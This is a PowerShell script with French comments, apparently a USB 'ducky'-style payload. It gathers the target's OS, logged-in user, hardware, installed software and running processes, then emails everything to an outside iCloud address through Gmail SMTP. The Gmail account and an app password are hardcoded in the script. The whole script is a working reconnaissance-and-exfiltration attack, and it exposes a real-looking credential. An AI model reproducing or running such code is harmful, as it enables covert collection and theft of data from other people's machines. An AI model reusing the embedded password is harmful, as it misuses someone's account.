# Fonction pour collecter des informations système détaillées
function Get-SystemInfo {
    $sysInfo = ""

    try {
        # Système d'exploitation
        $sysInfo += "Système d'exploitation: " + (Get-WmiObject Win32_OperatingSystem).Caption + "`n"
        
        # Version du système d'exploitation et architecture
        $sysInfo += "Version: " + (Get-WmiObject Win32_OperatingSystem).Version + "`n"
        $sysInfo += "Architecture: " + (Get-WmiObject Win32_OperatingSystem).OSArchitecture + "`n"

        # Utilisateur connecté
        $sysInfo += "Utilisateur connecté: " + [System.Security.Principal.WindowsIdentity]::GetCurrent().Name + "`n"

        # Processeur
        $sysInfo += "Processeur: " + (Get-WmiObject Win32_Processor).Name + "`n"

        # Mémoire installée
        $sysInfo += "Mémoire installée: " + [math]::round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2) + " GB`n"

        # Disques durs
        $disks = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 }
        $sysInfo += "Disques durs: " + ($disks | ForEach-Object { $_.DeviceID + " (" + $_.Size / 1GB + " GB)" }) -join "`n" + "`n"

        # Logiciels installés
        $installedSoftware = Get-WmiObject Win32_Product | Select-Object Name
        $sysInfo += "Logiciels installés: " + ($installedSoftware | ForEach-Object { $_.Name }) -join "`n" + "`n"

        # Processus en cours
        $processes = Get-Process | Select-Object Name
        $sysInfo += "Processus en cours: " + ($processes | ForEach-Object { $_.Name }) -join "`n" + "`n"

        # Dernière mise à jour de Windows
        $sysInfo += "Dernière mise à jour de Windows: " + (Get-WmiObject -Class Win32_OperatingSystem).LastBootUpTime + "`n"
    }
    catch {
        $sysInfo = "Erreur lors de la collecte des informations système : $_"
    }

    return $sysInfo
}

# Paramètres de l'email
$EmailFrom = "picoduckyraspberry@gmail.com"
$EmailTo = "clement14bs@icloud.com"
$Subject = "Données système collectées"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = 587
$Password = "derr olzd bjte tupv" # Utilisez un mot de passe sécurisé ou un mot de passe d'application Gmail

# Tenter de collecter les informations système
$sysInfo = Get-SystemInfo

# Créer le corps de l'email
$Body = "Voici les informations système collectées : `n" + $sysInfo

# Tentative d'envoi de l'email via SMTP
try {
    $Message = New-Object System.Net.Mail.MailMessage $EmailFrom, $EmailTo, $Subject, $Body
    $SMTP = New-Object Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
    $SMTP.EnableSsl = $true
    $SMTP.Credentials = New-Object System.Net.NetworkCredential($EmailFrom, $Password)
    $SMTP.Send($Message)
    Write-Host "Les informations système ont été envoyées avec succès."
}
catch {
    Write-Host "Erreur lors de l'envoi de l'email : $_"
}
